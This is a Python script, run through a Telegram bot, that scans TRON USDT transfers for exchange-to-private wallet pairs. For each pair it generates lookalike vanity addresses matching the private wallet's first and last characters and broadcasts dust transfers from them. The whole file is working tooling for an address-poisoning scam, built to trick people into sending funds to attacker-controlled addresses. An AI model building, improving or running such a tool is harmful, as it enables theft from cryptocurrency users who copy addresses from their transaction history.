import os
import time
import requests
import json
from collections import defaultdict
from datetime import datetime, timedelta, timezone
from tronpy import Tron
from tronpy.keys import PrivateKey

# =========================
# SETTINGS
# =========================
TRONGRID_URL = "https://api.trongrid.io"
TRONSCAN_URL = "https://apilist.tronscanapi.com"
USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

MIN_BALANCE_USD = 0  # Set to 0 for testing
MIN_TRANSFER_USD = 1  # Set to 1 for testing
REQUIRED_TRANSFERS = 2
WINDOW_DAYS = 7
TARGET_PAIRS = 5

TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")
TRONSCAN_API_KEY = os.getenv("TRONSCAN_API_KEY", "")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

# Global storage
found_pairs = []
transaction_logs = []
checked_wallets = set()
vanity_wallets = {}

# =========================
# TELEGRAM BOT
# =========================
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_telegram(message, parse_mode="HTML"):
    if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
        return
    try:
        requests.post(
            f"{TELEGRAM_URL}/sendMessage",
            json={"chat_id": CHAT_ID, "text": message, "parse_mode": parse_mode},
            timeout=10
        )
    except: pass

def get_telegram_updates(offset):
    if not TELEGRAM_BOT_TOKEN:
        return []
    try:
        r = requests.get(
            f"{TELEGRAM_URL}/getUpdates",
            params={"offset": offset, "timeout": 30},
            timeout=35
        )
        return r.json().get("result", [])
    except:
        return []

def check_if_cex(address):
    try:
        headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {}
        r = requests.get(
            f"{TRONSCAN_URL}/api/account",
            params={"address": address},
            headers=headers,
            timeout=10
        )
        data = r.json()
        tags = " ".join(data.get("tags", [])).lower()
        name = (data.get("accountName") or data.get("name") or "").lower()
        combined = tags + " " + name
        
        for keyword in CEX_KEYWORDS:
            if keyword in combined:
                return True, keyword.capitalize()
        return False, None
    except:
        return False, None

# =========================
# HTTP HELPERS
# =========================
def trongrid_get(path, params=None):
    headers = {}
    if TRONGRID_API_KEY:
        headers["TRON-PRO-API-KEY"] = TRONGRID_API_KEY
    url = TRONGRID_URL + path
    response = requests.get(url, params=params or {}, headers=headers, timeout=30)
    response.raise_for_status()
    return response.json()

def tronscan_get(path, params=None):
    headers = {}
    if TRONSCAN_API_KEY:
        headers["TRON-PRO-API-KEY"] = TRONSCAN_API_KEY
    url = TRONSCAN_URL + path
    response = requests.get(url, params=params or {}, headers=headers, timeout=30)
    response.raise_for_status()
    return response.json()

# =========================
# TRON ACCOUNT DATA
# =========================
def get_account(address):
    data = trongrid_get(f"/v1/accounts/{address}", {"only_confirmed": "true"})
    accounts = data.get("data", [])
    return accounts[0] if accounts else None

def get_trx_balance(address):
    account = get_account(address)
    if not account:
        return 0
    sun = int(account.get("balance", 0))
    return sun / 1_000_000

def get_usdt_balance(address):
    data = trongrid_get(
        f"/v1/accounts/{address}/trc20/balance",
        {"only_confirmed": "true", "contract_address": USDT_CONTRACT}
    )
    if isinstance(data, dict):
        if "data" in data and isinstance(data["data"], list) and data["data"]:
            item = data["data"][0]
            if isinstance(item, dict):
                value = item.get("balance", item.get("amount", 0))
                try:
                    return int(value) / 1_000_000
                except: pass
        if "balance" in data:
            try:
                return int(data["balance"]) / 1_000_000
            except: pass
    return 0

def get_usdt_transfers(address, start_ms, end_ms):
    transfers = []
    fingerprint = None
    while True:
        params = {
            "only_confirmed": "true",
            "only_to": "true",
            "limit": 200,
            "order_by": "block_timestamp,asc",
            "min_timestamp": start_ms,
            "max_timestamp": end_ms,
            "contract_address": USDT_CONTRACT
        }
        if fingerprint:
            params["fingerprint"] = fingerprint
        data = trongrid_get(f"/v1/accounts/{address}/transactions/trc20", params)
        rows = data.get("data", [])
        for row in rows:
            try:
                amount = int(row.get("value", 0)) / 1_000_000
                transfers.append({
                    "txid": row.get("transaction_id"),
                    "from": row.get("from"),
                    "to": row.get("to"),
                    "amount_usd": amount,
                    "token": "USDT",
                    "timestamp": row.get("block_timestamp", 0)
                })
            except: continue
        meta = data.get("meta", {})
        fingerprint = meta.get("fingerprint")
        if not fingerprint or not rows:
            break
    return transfers

# =========================
# QUALIFICATION CHECK - WITH DEBUG
# =========================
def check_wallet(address):
    now = datetime.now(timezone.utc)
    seven_days_ago = now - timedelta(days=WINDOW_DAYS)
    start_ms = int(seven_days_ago.timestamp() * 1000)
    end_ms = int(now.timestamp() * 1000)

    print(f"\n🔍 Checking: {address}")
    
    if address in checked_wallets:
        print("  ⚠️ Already checked, skipping")
        return False
    
    trx_balance = get_trx_balance(address)
    usdt_balance = get_usdt_balance(address)
    
    print(f"  💰 Balance: ${usdt_balance:.2f} USDT")
    
    if usdt_balance < MIN_BALANCE_USD:
        print(f"  ❌ Balance too low (min: ${MIN_BALANCE_USD})")
        return False

    transfers = get_usdt_transfers(address, start_ms, end_ms)
    print(f"  📄 Found {len(transfers)} USDT transfers in {WINDOW_DAYS} days")

    by_sender = defaultdict(list)
    for transfer in transfers:
        if transfer["amount_usd"] >= MIN_TRANSFER_USD:
            sender = transfer["from"]
            if sender:
                by_sender[sender].append(transfer)

    print(f"  👥 Found {len(by_sender)} unique senders")

    for sender, sender_transfers in by_sender.items():
        if len(sender_transfers) >= REQUIRED_TRANSFERS:
            print(f"  🎯 Pattern found! {sender[:20]}... sent {len(sender_transfers)} times")
            for i, tx in enumerate(sender_transfers[:3]):
                print(f"    {i+1}. ${tx['amount_usd']:.2f} | {tx['txid'][:20]}...")
            
            # DEBUG CEX CHECK
            print(f"  🔍 Checking if sender is CEX...")
            is_cex, cex_name = check_if_cex(sender)
            print(f"   CEX Result: {is_cex} ({cex_name})")
            
            # Check receiver
            print(f"  🔍 Checking if receiver is CEX...")
            is_receiver_cex, receiver_cex_name = check_if_cex(address)
            print(f"  📊 Receiver CEX: {is_receiver_cex} ({receiver_cex_name})")
            
            if is_cex and not is_receiver_cex:
                print(f"  ✅ QUALIFIED! Adding to found pairs")
                checked_wallets.add(address)
                found_pairs.append({
                    "wallet_a": sender,
                    "wallet_b": address,
                    "cex_name": cex_name or "Unknown",
                    "txids": [t["txid"] for t in sender_transfers[:2]]
                })
                
                msg = (f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS}</b>\n"
                       f"🏦 {cex_name}: <code>{sender[:20]}...</code>\n"
                       f"👤 Private: <code>{address[:20]}...</code>")
                send_telegram(msg)
                return True
            else:
                print(f"  ❌ Rejected - Sender is CEX: {is_cex}, Receiver is CEX: {is_receiver_cex}")
    
    checked_wallets.add(address)
    print("  ❌ No qualifying pattern found")
    return False

# =========================
# NETWORK DISCOVERY
# =========================
def discover_recent_transfers(limit=100):
    try:
        data = tronscan_get(
            "/api/transfer",
            params={"start": 0, "limit": limit, "sort": "-timestamp"}
        )
        return data.get("data", [])
    except Exception as e:
        print(f"Discovery error: {e}")
        return []

# =========================
# VANITY WALLET & TRANSFERS
# =========================
def calculate_similarity(vanity_addr, target_addr):
    prefix_match = sum(1 for i in range(8) if i < len(vanity_addr) and i < len(target_addr) and vanity_addr[i] == target_addr[i])
    suffix_match = sum(1 for i in range(1, 9) if i <= len(vanity_addr) and i <= len(target_addr) and vanity_addr[-i] == target_addr[-i])
    return prefix_match, suffix_match, prefix_match + suffix_match

def generate_vanity_wallet(target_address, max_attempts=50000):
    print(f"\n🔨 Generating vanity wallet for: {target_address[:20]}...")
    
    best_addr = None
    best_key = None
    best_score = 0
    best_prefix = 0
    best_suffix = 0
    
    start_time = time.time()
    
    for attempt in range(max_attempts):
        key = PrivateKey.random()
        addr = key.public_key.to_base58check_address()
        
        prefix_match, suffix_match, total_score = calculate_similarity(addr, target_address)
        
        if total_score > best_score:
            best_score = total_score
            best_prefix = prefix_match
            best_suffix = suffix_match
            best_addr = addr
            best_key = key.hex()
            
            if attempt % 10000 == 0 and attempt > 0:
                print(f"  Progress: {attempt}/{max_attempts} | Best: {best_prefix}+{best_suffix}={best_score}")
            
            if best_score >= 10:
                break
    
    elapsed = time.time() - start_time
    print(f"✅ Generated in {elapsed:.2f}s")
    print(f"   Vanity: {best_addr}")
    print(f"   Target: {target_address}")
    print(f"   Match: First {best_prefix}/8 + Last {best_suffix}/8 = {best_score}/16")
    
    wallet_id = f"vanity_{len(vanity_wallets)+1}"
    vanity_wallets[wallet_id] = {
        "address": best_addr,
        "private_key": best_key,
        "target": target_address,
        "prefix_match": best_prefix,
        "suffix_match": best_suffix,
        "total_score": best_score,
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    
    return best_addr, best_key, best_prefix, best_suffix

def list_vanity_wallets():
    if not vanity_wallets:
        return "📭 No vanity wallets generated yet"
    
    msg = f"📋 <b>Vanity Wallets ({len(vanity_wallets)})</b>\n\n"
    
    for wid, data in vanity_wallets.items():
        msg += f"<b>{wid}</b>\n"
        msg += f"🎭 Vanity: <code>{data['address']}</code>\n"
        msg += f"🎯 Target: <code>{data['target'][:20]}...</code>\n"
        msg += f"📊 Match: {data['prefix_match']}/8 (prefix) + {data['suffix_match']}/8 (suffix)\n"
        msg += f"🔑 Private Key: <code>{data['private_key']}</code>\n"
        msg += f" Created: {data['created_at']}\n\n"
    
    if len(msg) > 4000:
        msg = msg[:4000] + "\n<i>(truncated)</i>"
    
    return msg

def get_vanity_wallet_info(wallet_id):
    if wallet_id not in vanity_wallets:
        return f"❌ Wallet {wallet_id} not found"
    
    data = vanity_wallets[wallet_id]
    
    try:
        balance = get_trx_balance(data['address'])
        usdt_bal = get_usdt_balance(data['address'])
    except:
        balance = 0
        usdt_bal = 0
    
    msg = f"📊 <b>Vanity Wallet {wallet_id}</b>\n\n"
    msg += f"<b>Address:</b> <code>{data['address']}</code>\n"
    msg += f"<b>Private Key:</b> <code>{data['private_key']}</code>\n\n"
    msg += f"<b>Similarity to Target:</b>\n"
    msg += f"• Prefix match: {data['prefix_match']}/8 characters\n"
    msg += f"• Suffix match: {data['suffix_match']}/8 characters\n"
    msg += f"• Total score: {data['total_score']}/16\n\n"
    msg += f"<b>Current Balances:</b>\n"
    msg += f"• TRX: {balance:.6f}\n"
    msg += f"• USDT: {usdt_bal:.2f}\n\n"
    msg += f"<b>Target Wallet:</b> <code>{data['target']}</code>\n"
    msg += f"Created: {data['created_at']}"
    
    return msg

# =========================
# INTERACTIVE MODE
# =========================
def interactive_mode():
    send_telegram(
        f"🎯 <b>Target Reached! Found {len(found_pairs)} pairs</b>\n\n"
        f"<b>Available Commands:</b>\n"
        f"• <b>info</b> - Show all CEX→Private pairs\n"
        f"• <b>vanity</b> - List all generated vanity wallets\n"
        f"• <b>vanity [ID]</b> - Get details of specific vanity wallet\n"
        f"• <b>exclude [address]</b> - Remove a pair\n"
        f"• <b>logs</b> - Show transaction logs\n"
        f"• <b>transfer</b> - Execute all transfers\n"
        f"• <b>generate [pair#]</b> - Generate vanity wallet for pair #"
    )
    
    last_update_id = 0
    execute_triggered = False
    
    while not execute_triggered:
        updates = get_telegram_updates(last_update_id)
        
        for update in updates:
            last_update_id = update["update_id"]
            
            if update.get("message") and str(update["message"]["chat"]["id"]) == str(CHAT_ID):
                text = update["message"].get("text", "").strip()
                
                if text.lower() == "info":
                    if not found_pairs:
                        send_telegram("📭 No pairs found yet")
                    else:
                        msg = f"📋 <b>Found Pairs ({len(found_pairs)})</b>\n\n"
                        for i, p in enumerate(found_pairs):
                            msg += f"<b>Pair #{i+1}</b>\n"
                            msg += f"🏦 {p['cex_name']}: <code>{p['wallet_a']}</code>\n"
                            msg += f"👤 Private: <code>{p['wallet_b']}</code>\n\n"
                        send_telegram(msg)
                
                elif text.lower() == "vanity":
                    msg = list_vanity_wallets()
                    send_telegram(msg)
                
                elif text.lower().startswith("vanity "):
                    parts = text.split()
                    if len(parts) > 1:
                        wallet_id = parts[1]
                        msg = get_vanity_wallet_info(wallet_id)
                        send_telegram(msg)
                
                elif text.lower().startswith("generate"):
                    parts = text.split()
                    if len(parts) > 1:
                        try:
                            pair_num = int(parts[1]) - 1
                            if 0 <= pair_num < len(found_pairs):
                                pair = found_pairs[pair_num]
                                send_telegram(f"🔨 Generating vanity wallet for Pair #{pair_num+1}...")
                                addr, key, prefix, suffix = generate_vanity_wallet(pair['wallet_b'])
                                msg = (f"✅ <b>Vanity Wallet Generated</b>\n\n"
                                       f"🎭 Address: <code>{addr}</code>\n"
                                       f"🔑 Private Key: <code>{key}</code>\n"
                                       f"📊 Match: {prefix}/8 (prefix) + {suffix}/8 (suffix)\n\n"
                                       f"🎯 Target: <code>{pair['wallet_b']}</code>")
                                send_telegram(msg)
                            else:
                                send_telegram(f"❌ Pair #{parts[1]} not found")
                        except:
                            send_telegram("❌ Invalid pair number")
                
                elif text.lower().startswith("exclude"):
                    parts = text.split()
                    if len(parts) > 1:
                        addr = parts[1]
                        before = len(found_pairs)
                        found_pairs[:] = [p for p in found_pairs if p['wallet_b'] != addr and p['wallet_a'] != addr]
                        removed = before - len(found_pairs)
                        send_telegram(f"🗑️ Removed {removed} pair(s)")
                
                elif text.lower() == "logs":
                    if not transaction_logs:
                        send_telegram("📭 No transactions yet")
                    else:
                        msg = "📜 <b>Transaction Logs</b>\n\n"
                        for i, log in enumerate(transaction_logs):
                            msg += f"<b>#{i+1}</b>\n🎭 Vanity: <code>{log['vanity'][:20]}...</code>\nTX1: <code>{log['tx1']}</code>\nTX2: <code>{log['tx2']}</code>\n\n"
                        send_telegram(msg[:4000])
                
                elif text.lower() == "transfer":
                    if not found_pairs:
                        send_telegram("❌ No pairs to transfer")
                    else:
                        send_telegram(f"🚀 <b>Executing {len(found_pairs)} transfers...</b>")
                        execute_triggered = True
                        break
        
        time.sleep(5)
    
    return execute_triggered

# =========================
# MAIN
# =========================
def main():
    global found_pairs
    
    print("\n" + "="*60)
    print("       TRON WALLET MONITOR with Telegram Bot")
    print("="*60 + "\n")
    
    send_telegram("🚀 <b>TRON Wallet Monitor Started</b>\nLooking for CEX → Private wallet pairs...")
    
    now = datetime.now(timezone.utc)
    start = now - timedelta(days=WINDOW_DAYS)
    start_ms = int(start.timestamp() * 1000)
    end_ms = int(now.timestamp() * 1000)
    
    while len(found_pairs) < TARGET_PAIRS:
        print(f"\n🔄 Scanning... Found {len(found_pairs)}/{TARGET_PAIRS}")
        
        transfers = discover_recent_transfers(limit=100)
        print(f"📡 Discovered {len(transfers)} recent transfers")
        
        if not transfers:
            print("⚠️ No transfers found, waiting...")
            time.sleep(10)
            continue
        
        candidates = set()
        for tx in transfers:
            to_addr = tx.get("to") or tx.get("toAddress") or tx.get("to_address")
            if to_addr:
                candidates.add(to_addr)
        
        print(f"🎯 Found {len(candidates)} candidate wallets")
        
        for address in list(candidates)[:20]:
            if len(found_pairs) >= TARGET_PAIRS:
                break
            
            try:
                check_wallet(address)
            except Exception as e:
                print(f"❌ Error checking {address}: {e}")
            
            time.sleep(0.5)
        
        if len(found_pairs) < TARGET_PAIRS:
            time.sleep(5)
    
    # Enter interactive mode
    execute = interactive_mode()
    
    if execute:
        print("\n🚀 Executing transfers...")
        for i, pair in enumerate(found_pairs):
            print(f"\nProcessing pair {i+1}/{len(found_pairs)}")
            
            vanity_addr, vanity_priv, prefix, suffix = generate_vanity_wallet(pair['wallet_b'])
            
            if not vanity_addr:
                print("❌ Failed to generate vanity wallet")
                continue
            
            try:
                tron = Tron()
                
                # Main → Vanity
                priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
                sender = priv.public_key.to_base58check_address()
                tx1 = tron.trx.transfer(sender, vanity_addr, 1).build().sign(priv).broadcast().txid
                print(f"✅ TX1: {tx1}")
                
                time.sleep(3)
                
                # Vanity → Wallet A
                priv2 = PrivateKey(bytes.fromhex(vanity_priv))
                sender2 = priv2.public_key.to_base58check_address()
                tx2 = tron.trx.transfer(sender2, pair["wallet_a"], 1).build().sign(priv2).broadcast().txid
                print(f"✅ TX2: {tx2}")
                
                transaction_logs.append({
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "pair": pair,
                    "vanity": vanity_addr,
                    "tx1": tx1,
                    "tx2": tx2,
                    "similarity": f"{prefix}+{suffix}"
                })
                
                msg = (f"✅ <b>Transfer {i+1} Complete</b>\n"
                       f"🎭 Vanity: <code>{vanity_addr}</code>\n"
                       f"📊 Match: {prefix}/8 + {suffix}/8\n"
                       f"TX1: <code>{tx1}</code>\n"
                       f"TX2: <code>{tx2}</code>")
                send_telegram(msg)
                
            except Exception as e:
                print(f"❌ Transfer error: {e}")
                send_telegram(f"❌ Error: {e}")
            
            time.sleep(5)
        
        send_telegram("✅ <b>All transfers completed!</b>")
    
    print("\n✅ Workflow finished")

if __name__ == "__main__":
    main()  
